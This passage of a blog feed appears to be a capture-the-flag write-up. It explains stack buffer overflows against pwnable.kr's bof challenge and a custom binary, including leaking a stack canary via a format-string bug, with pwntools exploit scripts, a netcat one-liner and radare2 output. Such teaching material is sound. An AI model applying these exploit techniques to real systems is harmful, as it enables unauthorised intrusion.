+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Therefore, you have to evaluate these offsets manually.&lt;/p&gt;
+&lt;p&gt;First, set a breakpoint after the &lt;code&gt;gets&lt;/code&gt; function because the subsequent instruction is the comparison of &lt;code&gt;key&lt;/code&gt; and &lt;code&gt;0xcafebabe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Then locate our buffer offset, which is &lt;code&gt;0xffef8ffc&lt;/code&gt;, apparently.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And variable &lt;code&gt;key&lt;/code&gt;&amp;rsquo;s offset, &lt;code&gt;0xffef9030&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Evaluate this expression: &lt;code&gt;0xffef9030 - 0xffef8ffc = 0x34 = 52 (decimal) &amp;lt;-- padding length&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Also, you can try using this shortcut instead of those weary steps.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x5658662c&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt;? &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;pxr &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; @ebp+8 ~&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;dr eax&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Hence, our skeleton payload:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PADDING (52) + KEY_VALUE
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;solvepy-2&#34;&gt;Solve.py&lt;/h3&gt;
+&lt;p&gt;Either of these should work properly.&lt;/p&gt;
+&lt;p&gt;One-liner: &lt;code&gt;python -c&amp;quot;print(b&#39;a&#39;*52+b&#39;\xbe\xba\xfe\xca&#39;)&amp;quot; | tee payload &amp;amp;&amp;amp; (cat payload &amp;amp;&amp;amp; cat)| nc pwnable.kr 9000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_09-21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Pwntools:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xcafebabe&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;local&amp;#39;&lt;/span&gt;):
+		r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./bof&amp;#39;&lt;/span&gt;)
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+		r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwnable.kr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;)
+	r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean()
+	r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+	r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_12-07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;canary-custom&#34;&gt;Canary (custom)&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Successfully bypass canary and call &lt;code&gt;win()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Source:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Build: $ gcc canary.c -o canary -no-pie -fstack-protector -z execstack
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// The option &amp;#34;-fstack-protector&amp;#34; enables canary
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vuln&lt;/span&gt;() {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
+
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Leak me&amp;#34;&lt;/span&gt;);
+    gets(buffer);
+
+    printf(buffer);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
+
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Overflow me&amp;#34;&lt;/span&gt;);
+    gets(buffer);
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+    vuln();
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;win&lt;/span&gt;() {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You won!&amp;#34;&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This simple challenge ideally demonstrates how we can bypass stack protection, as know as stack canary.&lt;/p&gt;
+&lt;p&gt;But before being able to understand the crucial part, we should get hold of the protection bit first. To put it simply, at the prologue of a function, a random value is place onto the stack and before the program execute &lt;code&gt;ret&lt;/code&gt;, the present value of that variable is to be compared with the initial and a &lt;code&gt;***stack smashing detected***&lt;/code&gt; error message would show up thereafter if they are not the same; otherwise, exit normally.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;Stack canaries in Linux is a bit more tricky as they end in &lt;code&gt;00&lt;/code&gt;, which will null-terminated any strings in case you make mistakes using print functions. Still, it makes them much easier to spot.&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;code-breakdown-2&#34;&gt;Code breakdown&lt;/h3&gt;
+&lt;p&gt;There are three functions: &lt;code&gt;main&lt;/code&gt;, &lt;code&gt;vuln&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;win&lt;/code&gt; is isolated and &lt;code&gt;main&lt;/code&gt; merely calls &lt;code&gt;vuln&lt;/code&gt;. &lt;code&gt;vuln&lt;/code&gt;, however, reads a buffer of 32 bytes twice, before and after printing it using &lt;code&gt;puts&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;solution-3&#34;&gt;Solution&lt;/h3&gt;
+&lt;h4 id=&#34;1-brute-forcing&#34;&gt;1. Brute-forcing&lt;/h4&gt;
+&lt;p&gt;Please do remember that this method &lt;strong&gt;works exclusively with 32-bit programs&lt;/strong&gt; and sometimes is the sole solution when there are no leak capabilities. Since it is, unfortunately, not practicable with our particular 64-bit binary, we will discuss the method further at another time.&lt;/p&gt;
+&lt;h4 id=&#34;2-leaking-a-stack-canary&#34;&gt;2. Leaking a Stack Canary&lt;/h4&gt;
+&lt;p&gt;This method aim is to read the value of the canary through a certain &lt;strong&gt;format string leakages&lt;/strong&gt;, such as &lt;code&gt;read&lt;/code&gt;, &lt;code&gt;strncpy&lt;/code&gt;, &lt;code&gt;puts&lt;/code&gt; and &lt;code&gt;printf&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A format string bug is a simple, yet, powerful auxiliary which if you can manipulate and leverage it to perform reading or even writing to arbitrary memory regions. Imagine you have a small code snippet as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
+printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x %x %x&amp;#34;&lt;/span&gt;, a, a, a);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Expected output:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;40 40 40
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But supposing we have 3 format identifiers with only a single argument.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
+printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x %x %x&amp;#34;&lt;/span&gt;, a);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;40 3c27ed48 61879738
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not meet the expected amount of arguments, &lt;code&gt;printf&lt;/code&gt; simply continues printing the next values on the stack, &lt;em&gt;thus leaking&lt;/em&gt; them. Hence, the latter two, &lt;code&gt;3c27ed48&lt;/code&gt; and &lt;code&gt;61879738&lt;/code&gt;, are probably not our &lt;code&gt;int a = 64&lt;/code&gt; but &lt;em&gt;random&lt;/em&gt; junk value on the stack.&lt;/p&gt;
+&lt;p&gt;Let us have a glance at the vulnerable source again.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;vuln()&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+...
+	puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Leak me&amp;#34;&lt;/span&gt;);
+    gets(buffer);
+
+    printf(buffer);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
+
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Overflow me&amp;#34;&lt;/span&gt;);
+    gets(buffer);
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;puts&lt;/code&gt; function allows us to leak the canary, we then can use that value to overwrite the canary itself and finally call &lt;code&gt;win()&lt;/code&gt; to achieve the initial goal.&lt;/p&gt;
+&lt;p&gt;Now to the most intriguing phase, let us load it in radare2 and in most practical cases, you should first check the protection properties of the binary. It either could be done using &lt;a href=&#34;https://github.com/slimm609/checksec.sh&#34;&gt;checksec&lt;/a&gt; or &lt;a href=&#34;https://r2wiki.readthedocs.io/en/latest/tools/rabin2/&#34;&gt;rabin2&lt;/a&gt;, whatever comes to your liking.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_12-49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Next, we want to set a breakpoint at the subsequent instruction near the first &lt;code&gt;gets&lt;/code&gt; and a second breakpoint around the canary so that we can easily determine our canary offset.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_13-12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Executing the program and hit the first breakpoint at &lt;code&gt;0x00401163&lt;/code&gt;, we are therefrom able to read the canary value. Furthermore, we can calculate the padding length between our buffer and the canary by evaluating &lt;code&gt;0x50 - 0x8 = 0x48 = 72 (decimal)&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7f347597b050]&amp;gt; s sym.vuln;pdf
+
+┌ 133: sym.vuln ();
+│           ; var int64_t var_50h @ rbp-0x50	; our 32-byte buffer
+│           ; var int64_t var_8h @ rbp-0x8		; canary variable
+...
+│           0x0040115a      64488b042528.  mov rax, qword fs:[0x28]	; stored canary in RAX
+│           0x00401163 b    488945f8       mov qword [var_8h], rax	; Breakpoint 1
+...
+
+[0x00401163]&amp;gt; dr rax
+0xdc9e3a07a36a200
+[0x00401163]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Our current canary value: &lt;code&gt;0xdc9e3a07a36a200&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then, we need to know how far is it from our buffer offset to the canary&amp;rsquo;s and in order to do so, let us hit the second breakpoint and read the stack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-20.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So the buffer is 15 addresses (or 64 bytes) from the canary, that is also the reason why &lt;code&gt;%15$p&lt;/code&gt; is our input so that &lt;code&gt;puts&lt;/code&gt; can print out the special sentinel value.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And we successfully get the correct value of the canary.&lt;/p&gt;
+&lt;p&gt;Nevertheless, keep in mind that stack canaries are randomized for every new process, so we have to automate the canary leaking procedure as below:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./canary&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Leak me&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%15$p&amp;#39;&lt;/span&gt;)
+
+canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Canary: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; hex(canary))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-45.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And thus far we have had our skeleton payload:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (??) + WIN_OFFSET (??)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to calculate &lt;code&gt;PAD_TIL_RIP&lt;/code&gt;, let us get back to radare2 and set another breakpoint after the second &lt;code&gt;gets&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Stop at the second breakpoint we have set at the beginning, here I want you to remember that our current canary offset is at &lt;code&gt;0x7fffb74f25c0+16 = 0x7fffb74f25d0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-36.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Follow the execution flow, we now hit the third breakpoint after &lt;code&gt;gets&lt;/code&gt; then we examine the data chunk at &lt;code&gt;0x7fffb74f25d0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-44.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Using &lt;a href=&#34;https://r2wiki.readthedocs.io/en/latest/tools/ragg2/&#34;&gt;ragg2&lt;/a&gt; pattern, we now know the RIP offset is 16 bytes from the canary&amp;rsquo;s start point, and the canary size is 8 (or 4 in 32-bit) bytes so our &lt;code&gt;PAD_TIL_RIP&lt;/code&gt; is &lt;code&gt;16 - 8 = 8&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;And the last factor is &lt;code&gt;WIN_OFFSET&lt;/code&gt;, you can dump it out either using objdump&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-56.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;or &lt;code&gt;afl~win&lt;/code&gt; within radare2.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-57.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solvepy-3&#34;&gt;Solve.py&lt;/h3&gt;
+&lt;p&gt;You finally made it here, congratulation.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (8) + WIN_OFFSET (0x004011ec)
+&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./canary&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Leak me&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%15$p&amp;#39;&lt;/span&gt;)
+
+canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Canary: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; hex(canary))
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; asm(shellcraft&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nop()) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# PAD_TIL_CANARY&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(canary)					&lt;span style=&#34;color:#75715e&#34;&gt;# CANARY&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; asm(shellcraft&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nop()) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# PAD_TIL_RIP&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x004011ec&lt;/span&gt;)				&lt;span style=&#34;color:#75715e&#34;&gt;# WIN_OFFSET&lt;/span&gt;
+
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Overflow me&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, payload)
+
+print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean())
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_16-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
